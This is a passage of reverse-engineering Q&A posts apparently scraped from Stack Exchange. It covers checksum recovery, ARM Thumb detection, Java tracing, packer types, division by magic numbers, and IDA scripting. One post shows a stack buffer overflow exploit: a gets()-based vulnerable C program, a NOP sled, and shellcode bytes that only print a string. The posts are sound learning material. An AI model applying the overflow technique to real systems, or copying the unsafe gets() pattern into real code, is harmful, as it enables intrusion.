    for (i=0; i &lt; sz; ++i) {
        if ((i != 1) &amp;&amp; (i != 2))
            sum = sum*33 + pkt[i];
    }
    return sum;
}

int main()
{
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s1, sizeof(s1)-1), *(uint16_t *)(&amp;s1[1]));
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s2, sizeof(s2)-1), *(uint16_t *)(&amp;s2[1]));
    printf(""calculated %4.4x, actual %4.4x\n"", 
         verify(s3, sizeof(s3)-1), *(uint16_t *)(&amp;s3[1]));
    return 0;
}
</code></pre>

<p>Here's the output from that program:</p>

<pre><code>calculated 7201, actual 7201
calculated 704f, actual 704f
calculated 6e46, actual 6e46
</code></pre>

<h1>Update:</h1>

<p>I thought it might be useful to describe how I came about this answer so that it may help others in the future.  First, as other answers note, your packets that were identical except for a single bit were invaluable in determining the general checksum algorithm (multiplying by 33 and adding the next byte). </p>

<p>What remained was to determine the starting position which could have included the first byte (the one you're calling the <em>index byte</em>) and/or the length.  When I compared two packets which were identical except for the index byte, and assuming a linear relationship also for these bytes, it was easy to determine that the index byte was ""next to"" the data bytes for calculation purposes.  </p>

<p>When I did that, all of the complete packets among your samples differed from my calculated value (long packets all by the constant <code>0xe905</code> and short packets by <code>0x6a45</code>).  Since the checksum is only 2 bytes, I guessed that there might be a 2-byte initialization value and simply wrote a small program to try all combinations.  I chose one combination (A3 02) but in fact, there are exactly eight combinations that work -- all you need is something that ultimately evaluates to <code>0x1505</code> (5381 decimal).</p>
","4489"
"Illegal Instruction exploiting sample Buffer Overflow code","6190","","<p>Some days ago I coded a simple code to test a buffer overflow exploitation on x86 system. In order to keep it simple I disabled ASLR and NX so there are no protection that could cause weird behaviours.</p>

<p>This is my C code to exploit:</p>

<pre><code>#include &lt;stdio.h&gt;

void read_txt(){
        char txt[64];
        printf(""Write something:"");
        gets(txt);
}


int main(){
    read_txt();
    return 0;
}
</code></pre>

<p>I also wrote my own shellcode that just prints a string. As far as I know the payload should be something like this, fill the buffer with NOP instructions + shellcode, add 0x41414141 (AAAA) to overwrite EBP register and finally I override the return address with an address pointing to the middle of the NOPs.</p>

<p>Actually it does not work in that way and my payload is as follows:</p>

<pre><code>[1-\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x20\x3b\x29\x20\x68\x68\x73\x65\x63\x68\x20\x48\x69\x67\x68\x48\x6f\x6c\x61\x89\xe1\xb2\x0f\xcd\x80\xb0\x01\x31\xdb][2-\x41\x41\x41\x41][3-\x89\xf4\xff\xbf][4-\x89\xf4\xff\xbf]

1- NOPs + Shellcode = 60bytes
2- AAAA =4 bytes (Padding to fill the buffer, if NOP+Shellcode fills 64bytes it does not work)
3- Address to override EBP (In the middle of NOPs)
4- Overrides Return Address
</code></pre>

<p>This exploit works on gdb but fails if I pass the payload directly to the program, and I think that the problem is that just before the program executes gets() function the disasembler shows the <strong>leave</strong> instruction which points esp to ebp and causes an error.</p>

<p>This is the disassembly of read_txt() function:</p>

<pre><code>0x0804844c &lt;+0&gt;:    push   %ebp
   0x0804844d &lt;+1&gt;: mov    %esp,%ebp
   0x0804844f &lt;+3&gt;: sub    $0x44,%esp
   0x08048452 &lt;+6&gt;: movl   $0x8048510,(%esp)
   0x08048459 &lt;+13&gt;:    call   0x8048320 &lt;printf@plt&gt;
   0x0804845e &lt;+18&gt;:    lea    -0x40(%ebp),%eax
   0x08048461 &lt;+21&gt;:    mov    %eax,(%esp)
   0x08048464 &lt;+24&gt;:    call   0x8048330 &lt;gets@plt&gt;
   0x08048469 &lt;+29&gt;:    leave  
   0x0804846a &lt;+30&gt;:    ret    
</code></pre>

<p>And this is the execution of the exploit on GDB:</p>

<pre><code>(gdb) x/20x $esp
0xbffff47c: 0xbffff480  0x90909090  0x90909090  0x90909090
0xbffff48c: 0x90909090  0xc0319090  0xc931db31  0x04b0d231
0xbffff49c: 0x206801b3  0x6820293b  0x63657368  0x69482068
0xbffff4ac: 0x6f486867  0xe189616c  0x80cd0fb2  0xdb3101b0
0xbffff4bc: 0x41414141  0xbffff489  0xbffff489  0xbffff500
(gdb) s
Warning:
Cannot insert breakpoint 0.
Error accessing memory address 0x90909090: I/O Error.

0xbffff489 in ?? ()
(gdb) c
Continuing.
Shellcode Executed
Program received signal SIGSEGV, Segmentation fault.
0xbffff4b9 in ?? ()
(gdb) 
</code></pre>

<p>Notice that EBP points to 0x90909090 because it has the same address that overrides the return address, and also notice the string <strong>Shellcode Executed</strong> that is the shellcode included in the payload.</p>

<p>My question is, where could I point EBP to avoid this problem before pointing the return address to the NOP slide? Also as secondary question why I can't fill the 64bytes buffer with NOPs+Shellcode?</p>

<p>Regards.</p>
","<p>In fact, the memory layout within <code>gdb</code> and outside of it differs of a few bytes. There have been recently a question about this here. You can read: <a href=""https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled"">How to predict address space layout differences between real and gdb-controlled executions?</a></p>

<p>In your case, you may just have to adjust your address by adding/subtracting 96 bytes.</p>

<p>I can, also, give you a few tricks with <code>gdb</code> to help you a bit with this:</p>

<ul>
<li><p><code>info frame</code>: This command gives you a full image of the frame you are in. Including where are stored the <em>saved eip</em> ans the <em>saved ebp</em>. It is extremely useful to observe if you reach the right spot in the memory to modify. You may set a breakpoint on <code>read_txt</code> and display the content of the <em>saved eip</em> before and after the <code>gets()</code> is called in order to see if the modification occurred properly.</p></li>
<li><p>When hitting a:</p>

<pre><code>0xbffff489 in ?? ()
</code></pre>

<p>It basically means that <code>gdb</code> did not find any symbol linked to the memory location. But, it might be assembly code, especially if it is your shellcode. So, to disassemble it you can use either of these commands:</p>

<ul>
<li><code>disas 0xbffff489,+40</code></li>
<li><code>x /10i 0xbffff489</code></li>
</ul></li>
</ul>

<p>Hope this help.</p>
","2997"
"How to detect thumb mode in ARM disassembly?","6156","","<p>I try to build a small disassembler for ARM, and I would like to know how do <code>objdump</code> manage to sort out the normal mode instructions (32-bits instruction wide) from the thumb mode instructions (16-bits instruction wide) without having to look at the <code>t</code> flag in the CPSR.</p>

<p>But first, let us build a small example and make some experiments on it. </p>

<p>I wrote this small piece of ARM assembly (<code>gas</code> syntax) as basis example:</p>

<pre><code>.arm
    mov fp, #0
    moveq   r1, r0
.thumb
    mov r0, #0
    mov fp, r0
</code></pre>

<p>Then, I cross-compiled it like this:</p>

<pre><code>$&gt; arm-none-eabi-gcc -Wall -Wextra -mlittle-endian -c -o arm_sample arm_sample.s
</code></pre>

<p>And, here is the output of <code>objdump</code> on the ARM object file:</p>

<pre><code>$&gt; objdump -d ./arm32_mov

./arm32_mov:     file format elf32-littlearm

Disassembly of section .text:
00000000 &lt;.text&gt;:
   0:   e3a0b000    mov fp, #0
   4:   01a01000    moveq   r1, r0
   8:   2000        movs    r0, #0
   a:   4683        mov fp, r0
</code></pre>

<p>But, when I run my tool, I get:</p>

<pre><code> warning: decoder says at (0x8,0):'strmi r2, [r3], r0' : Unknown mnemonic
   0:   00 b0 a0 e3                 mov fp, #0
   4:   00 10 a0 01                 moveq   r1, r0
   8:   ...
</code></pre>

<p>My tool is based on <code>libopcodes</code> (exactly like <code>objdump</code>), so the third instruction is just interpreted as still in 32-bits mode and the two thumb mode instructions are just interpreted as one 32-bits instruction which gives <code>strmi r2, [r3], r0</code>.</p>

<p>My question is that I don't understand how <code>objdump</code> knows that there is a switch between normal mode to thumb mode. Before discovering this, I thought that this information was only available at execution time though the value of the <code>t</code> flag in the CPSR status register.</p>

<p>I tried to look at the code of <code>objdump</code> but, I didn't see any architecture dependent cases to treat the case of the ARM thumb mode. So, this is still a mystery to me... </p>

<p>Any suggestion is welcome !</p>

<p><strong>EDIT</strong></p>

<p>In fact, I worked on an object file (compiled with <code>-c</code> option), so there is not so much symbols. But, here is a more detailed output obtained through <code>objdump</code>:</p>

<pre><code>$&gt; objdump -x ./arm32_mov

./arm32_mov:     file format elf32-littlearm
./arm32_mov
architecture: armv4t, flags 0x00000010:
HAS_SYMS
start address 0x00000000
private flags = 5000000: [Version5 EABI]

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         0000000c  00000000  00000000  00000034  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .data         00000000  00000000  00000000  00000040  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  2 .bss          00000000  00000000  00000000  00000040  2**0
                  ALLOC
  3 .ARM.attributes 00000016  00000000  00000000  00000040  2**0
                  CONTENTS, READONLY
SYMBOL TABLE:
00000000 l    d  .text  00000000 .text
00000000 l    d  .data  00000000 .data
00000000 l    d  .bss   00000000 .bss
00000000 l    d  .ARM.attributes    00000000 .ARM.attributes
</code></pre>

<p>And, here is the output of <code>readelf</code>:</p>

<pre><code>$&gt; readelf -a ./arm32_mov
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           ARM
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          148 (bytes into file)
  Flags:                             0x5000000, Version5 EABI
  Size of this header:               52 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           40 (bytes)
  Number of section headers:         8
  Section header string table index: 5

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        00000000 000034 00000c 00  AX  0   0  4
  [ 2] .data             PROGBITS        00000000 000040 000000 00  WA  0   0  1
  [ 3] .bss              NOBITS          00000000 000040 000000 00  WA  0   0  1
  [ 4] .ARM.attributes   ARM_ATTRIBUTES  00000000 000040 000016 00      0   0  1
  [ 5] .shstrtab         STRTAB          00000000 000056 00003c 00      0   0  1
  [ 6] .symtab           SYMTAB          00000000 0001d4 000070 10      7   7  4
  [ 7] .strtab           STRTAB          00000000 000244 000007 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)

There are no section groups in this file.
There are no program headers in this file.
There are no relocations in this file.
There are no unwind sections in this file.

Symbol table '.symtab' contains 7 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 SECTION LOCAL  DEFAULT    1 
     2: 00000000     0 SECTION LOCAL  DEFAULT    2 
     3: 00000000     0 SECTION LOCAL  DEFAULT    3 
     4: 00000000     0 NOTYPE  LOCAL  DEFAULT    1 $a
     5: 00000008     0 NOTYPE  LOCAL  DEFAULT    1 $t
     6: 00000000     0 SECTION LOCAL  DEFAULT    4 

No version information found in this file.
Attribute Section: aeabi
File Attributes
  Tag_CPU_arch: v4T
  Tag_ARM_ISA_use: Yes
  Tag_THUMB_ISA_use: Thumb-1
</code></pre>

<p><strong>SOLUTION (Ian Cook)</strong></p>

<pre><code>$ objdump --syms --special-syms ./arm32_mov

./arm32_mov:     file format elf32-littlearm

SYMBOL TABLE:
00000000 l    d  .text  00000000 .text
00000000 l    d  .data  00000000 .data
00000000 l    d  .bss   00000000 .bss
00000000 l       .text  00000000 $a   &lt;-- ARM code
00000008 l       .text  00000000 $t   &lt;-- Thumb code
00000000 l    d  .ARM.attributes    00000000 .ARM.attributes
</code></pre>

<p>Just to be sure, I interleaved arm code, thumb code and arm code again. Here is the dump:</p>

<pre><code>$&gt; objdump --syms --special-syms ./arm32_mov

./arm32_mov:     file format elf32-littlearm

SYMBOL TABLE:
00000000 l    d  .text  00000000 .text
00000000 l    d  .data  00000000 .data
00000000 l    d  .bss   00000000 .bss
00000000 l       .text  00000000 $a
00000008 l       .text  00000000 $t
0000000c l       .text  00000000 $a
00000000 l    d  .ARM.attributes    00000000 .ARM.attributes
</code></pre>

<p>You can see that the ARM symbol is present twice at <code>0x0</code> and <code>0xc</code> and are surrounding the thumb symbol.</p>
","<p>An ARM object file should contain symbols identifying the regions that are arm code (<code>$a</code>), thumb code (<code>$t</code>) and literal data (<code>$d</code>).</p>

<p>You can see these as symbols #4 and #5 in your read-elf output.
i.e. offset <code>0</code> is arm, offset <code>8</code> is thumb</p>

<p>obj-dump will output these symbols too if you use the<code>--special-syms</code>option.</p>

<p>Reading the <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ihi0044e/IHI0044E_aaelf.pdf"" rel=""noreferrer"">ARM ELF ABI</a> will help you understand what's going on.</p>

<p>If you are planning to try to disassemble ARM code in an Apple (Mach-O) executable or in a firmware blob then you'll have to use another technique as these symbols won't be present.</p>
","6085"
"Dynamic java instrumentation?","6155","","<p>This is not strictly 'reverse engineering', it's mostly related to dynamic instrumentation.</p>

<p>So, in the same fashion as <code>strace</code> which allows you to see syscalls made by a process, or <code>ftrace</code> to see function calls, is there anything similar for Java?</p>

<p>What I am interested in is having a <code>.jar</code> file that is run in a javaVM. </p>

<p>Is there any way to instrument or trace all the Java API calls the application code makes ?</p>

<p>That is, without any static analysis of the contents of the <code>.jar</code> or without any editing of the contents of <code>.jar</code> (e.g. to add hooks). Ideally, a solution equivalent to <code>strace</code> or e.g. a manipulated javaVM</p>

<p>The same applies on Android - Is there a way to trace all Android framework API calls (or other essentially DalvikVM functions) an application makes without any editing at all of the APK file? All other editing of the environment/system is fine.</p>

<p>In my ideal world, the analyst would get the following output, while running an UNEDITED application (<code>.jar</code> or <code>.apk</code>):</p>

<pre><code>timestamp1: java.security.SecureRandom.getSeed() called. Arguments: (Number) 
timestamp2: javax.security.cert.X509Certificate.checkValidity() called. Arguments: (null)
...
timestamp3: java.sql.Connection.prepareStatement() called. Arguments: (""SELECT * FROM X WHERE Y = W"")
</code></pre>
","<h1>Oracle Java Virtual Machine</h1>

<p>Tracing the execution of a Java program can be done through the <a href=""http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/"">Java Platform Debugger Architecture</a> (JPDA). This framework allow you to get a full control of an execution within the JVM (without having to modify the original code). See this <a href=""http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html"">tutorial</a> for a more in depth view of this framework. </p>

<p>If you want to implement it by yourself, you should use the <a href=""http://docs.oracle.com/javase/7/docs/jdk/api/jpda/jdi/com/sun/jdi/request/MethodEntryRequest.html"">MethodEntryRequest</a> interface and intercept any method call.</p>

<p>But, if you are lazy (just like me), you'd better use already existing projects such as <a href=""http://mchr3k.github.io/org.intrace/"">InTrace</a> (see also the <a href=""http://mchr3k.github.io/org.intrace/related.html"">Related Projects' page</a> of the InTrace project).</p>

<h1>Android Java Dalvik Virtual Machine</h1>

<p>Tracing an Android Java program can be done through the <a href=""http://developer.android.com/tools/debugging/ddms.html"">Dalvik Debug Monitor Server</a> (DDMS) and the full <a href=""http://developer.android.com/tools/debugging/"">Android debug framework</a>.</p>

<p>There exist already some tools to trace the execution of programs such as <a href=""http://developer.android.com/tools/debugging/debugging-tracing.html"">Traceview and dmtracedump</a> tools. And, finally, a few tips about the <a href=""http://0xlab.org/~jserv/tmp/dalvik.pdf"">Dalvik JVM</a>.</p>
","1719"
"What are the different types of packers?","6109","","<p>I know the basic principle of a packer. Basically, it is a small routine launched at the beginning of the program that decompress the actual program and jump to it once achieved.</p>

<p>Yet, it seems that there are quite a lot of variations around this principles. I recently learned about ""<em>virtualized packers</em>"" or ""<em>on-the-fly packers</em>"", and I might miss a lot. So, can somebody define what a basic packer is and then explain what are the different types that can be encountered ?</p>
","<h1>Generic definition</h1>

<p>Binary packers alter the original binary data, and restore it (more or less) before execution.</p>

<p>Their different names depend more on their characteristic: it's difficult to clearly distinguish, as just putting an anti-debug and a Xor loop would make a packer also a protector and a cryptor.</p>

<h1>types</h1>

<h2>extension</h2>

<p>extra packer code is executed</p>

<ul>
<li>compressor: reduce original data's size
<ul>
<li>common: aPLib (FSG, , LZMA, NRV (UPX)</li>
<li>others: JCALG1, BriefLZ, LZMAT</li>
</ul></li>
<li>protector: makes reverse engineering harder
<ul>
<li>countermeasures:
<ul>
<li>anti-debugging: IsDebuggerPresent, ...</li>
<li>anti-virtualization: detect VmWare, ...</li>
<li>anti-dumping: erase header in memory...</li>
<li>anti tampering, via checksums
<ul>
<li>common: rolling checksum, CRC32, md5, sha1, adler, md4</li>
<li>others: Tiger, Whirlpool, md4, adler</li>
</ul></li>
</ul></li>
</ul></li>
<li>cryptor: crypts original data
<ul>
<li>common: bitwise operators (XOR/ROL/...), LCG, RC4, Tea</li>
<li>others: DES, AES, Blowfish, Trivium, IDEA, ElGamal</li>
</ul></li>
</ul>

<h2>transformation</h2>

<p>the original code is rewritten</p>

<ul>
<li>virtualizer: turns original code into virtual code with embedded virtual machine</li>
<li>mutater: alters code — same instruction set and architecture, but modified:
<ul>
<li>reflowing</li>
<li>oligomorphism</li>
</ul></li>
</ul>

<h1>extra features</h1>

<ul>
<li>bundler: file dropping, with API hooking (to make a multi-file program run as single file)</li>
</ul>

<p>These <a href=""https://corkami.googlecode.com/files/packers.pdf"" rel=""nofollow"">graphics</a> might help as further reference.</p>
","1780"
"How can I reverse optimized integer division/modulo by constant operations?","6035","","<p>When compiling a division or modulo by a constant, my compiler (LLVM GCC) generates a series of instructions that I don't understand.</p>

<p>When I compile the following minimal examples:</p>

<pre><code>int mod7(int x) {
    return x % 7;
}

int div7(int x) {
    return x / 7;
}
</code></pre>

<p>The following code is generated:</p>

<pre><code>_mod7:
    push   rbp
    mov    rbp,rsp

    mov    ecx,0x92492493
    mov    eax,edi
    imul   ecx
    add    edx,edi
    mov    eax,edx
    shr    eax,0x1f
    sar    edx,0x2
    add    edx,eax
    imul   ecx,edx,0x7
    mov    eax,edi
    sub    eax,ecx

    pop    rbp
    ret    


_div7:
    push   rbp
    mov    rbp,rsp

    mov    ecx,0x92492493
    mov    eax,edi
    imul   ecx
    add    edx,edi
    mov    ecx,edx
    shr    ecx,0x1f
    sar    edx,0x2
    mov    eax,edx
    add    eax,ecx

    pop    rbp
    ret
</code></pre>

<ul>
<li>How is this mathematically equivalent, and where do the constants come from?</li>
<li>What's the easiest way to turn the assembly back in to C (for arbitrary constants on the right-hand side)?</li>
<li>How could a tool, such as a decompiler or analysing disassembler, automate this process?</li>
</ul>
","<h1>First</h1>

<p>Unfortunately we don't seem to have MathJax turned on in this stackexchange so the math parts below are pretty horribly formatted. I'm also far from a mathematician so the notation may be off in some places.</p>

<h1>Understanding the magic number and code</h1>

<p>The goal of the code above is to rewrite a division into a multiplication because division takes more clock cycles than a multiplication. It's in the area of about twice as many cycles, depending very much on CPU. So we need to find a nice branchless way of doing that. If we branch we're very likely to lose to simply doing division.</p>

<p>One way is to simply realize that division is the same as multiplication with the inverse of the number, i.e <img src=""https://i.stack.imgur.com/yhMdN.gif"" alt="""">. The problem is that <img src=""https://i.stack.imgur.com/V3EXb.gif"" alt=""""> is a pretty poor number to store as an integer. So we need to multiply both the divisor and dividend by some number. Since we're operating on 32-bit numbers and we get multiplication results in 64-bit numbers we get the best precision with <img src=""https://i.stack.imgur.com/GAbp5.gif"" alt=""""> and we also avoid overflow issues. So we basically get <img src=""https://i.stack.imgur.com/66B6M.gif"" alt="""">. Now that fractional part is what causes us issues because it will cause rounding errors.</p>

<p>So let's try to formalize this:</p>

<p><img src=""https://i.stack.imgur.com/CXkJ4.gif"" alt=""""></p>

<p>Where <img src=""https://i.stack.imgur.com/85yOF.gif"" alt=""""> is our multiplicand, e.g <img src=""https://i.stack.imgur.com/GKdkC.gif"" alt="""">, or really any number <img src=""https://i.stack.imgur.com/4sVUA.gif"" alt=""""> but <img src=""https://i.stack.imgur.com/mb7TH.gif"" alt=""""> works very well with our register sizes as we can simply discard the lower 32-bit register. <img src=""https://i.stack.imgur.com/p5VNy.gif"" alt=""""> is the number you must add to make <img src=""https://i.stack.imgur.com/85yOF.gif"" alt=""""> evenly divisible by <img src=""https://i.stack.imgur.com/FObhE.gif"" alt="""">. <img src=""https://i.stack.imgur.com/31LSW.gif"" alt=""""> is the number we wish to divide.</p>

<p>We can rewrite the equation above, as</p>

<p><img src=""https://i.stack.imgur.com/S56kc.gif"" alt=""""></p>

<p>Which illustrates the point that we have our dividend <img src=""https://i.stack.imgur.com/8dTDm.gif"" alt=""""> divided by our divisor <img src=""https://i.stack.imgur.com/7kJpl.gif"" alt=""""> and then an error factor of <img src=""https://i.stack.imgur.com/lKedW.gif"" alt="""">.</p>

<p>Studying our original equation of <img src=""https://i.stack.imgur.com/ZP83c.gif"" alt=""""> it's clear that we can affect very little. <img src=""https://i.stack.imgur.com/QvBxq.gif"" alt=""""> needs to be a power of 2, can't be too large or we risk an overflow and can't be too small as it has a direct negative effect on our error factor <img src=""https://i.stack.imgur.com/W87D3.gif"" alt="""">. <img src=""https://i.stack.imgur.com/J5UAz.gif"" alt=""""> directly depends on <img src=""https://i.stack.imgur.com/tFARj.gif"" alt=""""> and <img src=""https://i.stack.imgur.com/IS3SB.gif"" alt="""">.</p>

<p>So let's try <img src=""https://i.stack.imgur.com/qAwQ9.gif"" alt=""""> which gives a maximum error fraction of <img src=""https://i.stack.imgur.com/W87D3.gif"" alt=""""> with the maximum value of <img src=""https://i.stack.imgur.com/boZtv.gif"" alt=""""> being <img src=""https://i.stack.imgur.com/Sppdl.gif"" alt="""">, so <img src=""https://i.stack.imgur.com/5GbVt.gif"" alt="""">, unfortunately this is not less than <img src=""https://i.stack.imgur.com/Q9RYV.gif"" alt=""""> so we can get rounding errors. </p>

<p>We'll increase the exponent of <img src=""https://i.stack.imgur.com/IAyRL.gif"" alt=""""> to <img src=""https://i.stack.imgur.com/yqG5j.gif"" alt="""">, which gives <img src=""https://i.stack.imgur.com/SV70X.gif"" alt="""">, maximum error fraction <img src=""https://i.stack.imgur.com/CN6ya.gif"" alt=""""> which is less than <img src=""https://i.stack.imgur.com/wOBpa.gif"" alt="""">. This means that our multiplicand is <img src=""https://i.stack.imgur.com/vNO9f.gif"" alt=""""> which is not less than or equal to the maximum signed value we can store in a 32-bit register (<img src=""https://i.stack.imgur.com/up1Y5.gif"" alt="""">). So we instead make the multiplicand <img src=""https://i.stack.imgur.com/aaEyn.gif"" alt="""">. As a side note, thanks to the magic of two's complement when we subtract <img src=""https://i.stack.imgur.com/vwBYh.gif"" alt=""""> the number <img src=""https://i.stack.imgur.com/jZA7P.gif"" alt=""""> is <img src=""https://i.stack.imgur.com/jBOeP.gif"" alt=""""> which is <img src=""https://i.stack.imgur.com/xwp6c.gif"" alt=""""> when interpreted as an unsigned number. But we're doing signed arithmetic here. So we need to fix the final expression by adding <img src=""https://i.stack.imgur.com/2xny2.gif"" alt="""">. This also only solves the problem for <img src=""https://i.stack.imgur.com/PevID.gif"" alt="""">, for negative numbers we will be off by 1 so we need to add 1 if we have a negative number.</p>

<p>That's the explanation for the constant in the multiplication and how to arrive at it. Now let's look at the code:</p>

<pre><code>; Load -1840700269
mov    ecx,0x92492493

; Load n
mov    eax,edi

; n * -1840700269
imul   ecx

; add n to compensate for 2^32 subtraction
add    edx,edi

; check the sign bit of our result
mov    ecx,edx
shr    ecx,0x1f

; divide by 2^2 to compensate for us using y=2^34 instead of 2^32
sar    edx,0x2

mov    eax,edx
; add the value of the sign bit to the final result
add    eax,ecx
</code></pre>

<h1>Calculating divisor from magic number and code</h1>

<p>I have not proven this mathematically, however if you want to recover the divisor from an assembly dump such as the one you showed we can do some simple mental excercises. First we need to realize that the following holds</p>

<p><img src=""https://i.stack.imgur.com/JscHH.gif"" alt=""""></p>

<p>Where <img src=""https://i.stack.imgur.com/dAO7x.gif"" alt=""""> is the adjustment we made in order to bring the value into the range of a 32-bit value. From the code we can devise the following, the right shift by two means that we have <img src=""https://i.stack.imgur.com/65UtM.gif"" alt="""">, <img src=""https://i.stack.imgur.com/5UvZn.gif"" alt="""">, <img src=""https://i.stack.imgur.com/NV0rJ.gif"" alt="""">, <img src=""https://i.stack.imgur.com/TR2L6.gif"" alt=""""> is unknown. This means that we're missing one variable in order to perform a perfect solution. However the effect of <img src=""https://i.stack.imgur.com/TR2L6.gif"" alt=""""> if negligible as its purpose is to bring the divisor as close to its integer value as possible. This means that the solution can be found by solving</p>

<p><img src=""https://i.stack.imgur.com/Nke6h.gif"" alt=""""></p>

<p><img src=""https://i.stack.imgur.com/jh1mk.gif"" alt=""""></p>

<p>Another example with divisor 31337 which has the multiplicand magic number 140346763 and right shifts 10 bits.</p>

<p><img src=""https://i.stack.imgur.com/JuH6C.gif"" alt=""""></p>

<h1>Finally</h1>

<p>For a complete mathematical breakdown of how this works, including all the appropriate proofs and algorithms for calculating the magic numbers, shifts and adds, see <a href=""http://rads.stackoverflow.com/amzn/click/0321842685"" rel=""noreferrer"">Hacker's Delight</a>, chapter 10-3.</p>
","1430"
"Disassembling MIPS Binaries","6031","","<p>I am searching for security vulnerabilities in the firmware of <a href=""http://www.downloads.netgear.com/files/GDC/WNDR3400V2/WNDR3400v2_V1.0.0.38_1.0.61.zip"" rel=""nofollow noreferrer"">this router</a>, its architecture is mips. <a href=""https://reverseengineering.stackexchange.com/questions/4034/router-decompiling"">I have successfully unpacked the file system</a>. I would like to disassemble the http daemon, located at <code>/usr/sbin/httpd</code>. How can I disassemble this program and run it in <code>spim</code>?</p>
","<p>I would like to second the suggestion of QEMU.</p>

<p>Craig has a post describing how to debug a MIPS binary running in QEMU using IDA:</p>

<p><a href=""http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/"" rel=""nofollow"">http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/</a></p>

<p>(you can also use GDB or another debugger speaking the GDB protocol)</p>
","4043"
"What's the difference between a disassembler, debugger and decompiler?","5968","","<p>I have heard of disassemblers like IDA and debuggers like OllyDbg but honestly, when you give both of them a binary file it gives me the assembly code. I know that the decompiler gives the source code if you provide it a binary. However, I don't know how they differ in terms of mode of operationand I ask myself questions like ""Why can a android/python code be decompiled but a C code be only disassembled?""</p>

<p>Can anyone give a precise difference between these 3 kinds of tools?</p>
","<p>These terms are currently defined on this site as follows:</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/tagged/disassemblers""><strong>Disassembler</strong></a>:</p>

<blockquote>
  <p>A disassembler is a software tool which transforms machine code into a
  human readable mnemonic representation called assembly language.</p>
</blockquote>

<p><a href=""https://reverseengineering.stackexchange.com/questions/tagged/debuggers""><strong>Debugger</strong></a>:</p>

<blockquote>
  <p>Debuggers allow the user to view and change the running state of a program.</p>
</blockquote>

<p><a href=""https://reverseengineering.stackexchange.com/questions/tagged/decompiler""><strong>Decompiler</strong></a>:</p>

<blockquote>
  <p>Software used to revert the process of compilation. Decompiler takes a
  binary program file as input and output the same program expressed in
  a structured higher-level language.</p>
</blockquote>
","4636"
"In IDA, is there a way to add a reference to a dynamically imported function into the Imports tab?","5936","","<p>The title says most of it. Say I have a Windows PE (x86, 32bit) binary (just so we have case to discuss), the imports list will usually only show the imports found in the import directory. The attributes it shows are address of the function, name and library from which it got imported as shown in this screenshot snippet:</p>

<p><img src=""https://i.stack.imgur.com/KYZWX.png"" alt=""Screenshot of import tab in IDA Pro""></p>

<p>Is there a way for me through scripting (IDC or Python, I don't care too much), to add imports of my own to the list and, for example, have them point (the address attribute) to code such as this (highlighted line)?:</p>

<p><img src=""https://i.stack.imgur.com/4lUw2.png"" alt=""Dynamically imported function in IDA Pro""></p>

<p>I.e. the line would in such case look like:</p>

<pre><code>0DCBA987     GetLongPathNameW       kernel32.dll
</code></pre>

<p>or even just</p>

<pre><code>0DCBA987     GetLongPathNameW       ???
</code></pre>

<p>assuming the above <code>call GetProcAddress</code> would be at address <code>0DCBA987</code>.</p>

<p>The advantage to me would be readability. But it would also yield a more comprehensive list of imports (and consequently xrefs) as some functions are frequently imported dynamically due to their availability in the various Windows versions.</p>

<p>It should be quite trivial given a certain binary to figure out all xrefs to candidate functions that retrieve the imported function's address (such as <code>GetProcAddress</code>) and then walk their calls to find which function was imported. The DLL part may be more complicated to find out, but it could be left empty or entered manually. But I didn't find a function that would allow me to add imports. Is there a way?</p>
","<p>I don't know if many people know this, but IDA uses some kind of a trick to decide if a segment is an imports segment, and handles it completely different.</p>

<p>IDA uses a few segment properties to treat a segment as an imports segment. for example, naming a segment <code>.idata</code>, or setting the segment's class to <code>XTRN</code> will immediately make it an imports segment. such segments <strong>won't</strong> display the usual code/data listings, function definitions and most of the other stuff we're used to in the Code View.</p>

<p>More specifically, adding code to those segments will be hidden in IDA, which will refuse displaying any assembly in those segments. A nice Anti-IDA trick I'd say :)</p>

<p>Instead, they'll only display name definitions, offsets and comments.
Once an offset is assigned a name of an API stored in IDA's database, IDA will get the API's prototype and other info, assign type definition and comments.</p>

<p>IIRC These APIs will also be shown in the imports window but i'm not sure what exactly triggers this. it might also depend on IDA versions and other import-related PE properties.</p>

<p><strong>EDIT</strong>
<br>It's been more than three years and obviously I couldn't find the script then, and I just went over some old code of mine and were able to reconstruct what I did in that script, and here is the gist of it:</p>

<pre><code>import idaapi
import idc

for import_rva, import_name in LIST_OF_IMPORTS:
    ea = imagebase + import_rva

    if idaapi.get_segm_class(getseg(ea)) == ""XTRN"":
        print(""import is already inside an XTRN segment, ""
              ""assuming it's correctly named"")
        continue
    elif idaapi.get_segm_class(getseg(ea-1)) == ""XTRN"":
        print(""Import is just below an import segment, ""
              ""extending segment to include this additional import"")
        # shrinking it's current segment
        # WARNING: this assumes current import is at the top of its segment
        # otherwise we'll have to SPLIT the import's current segment
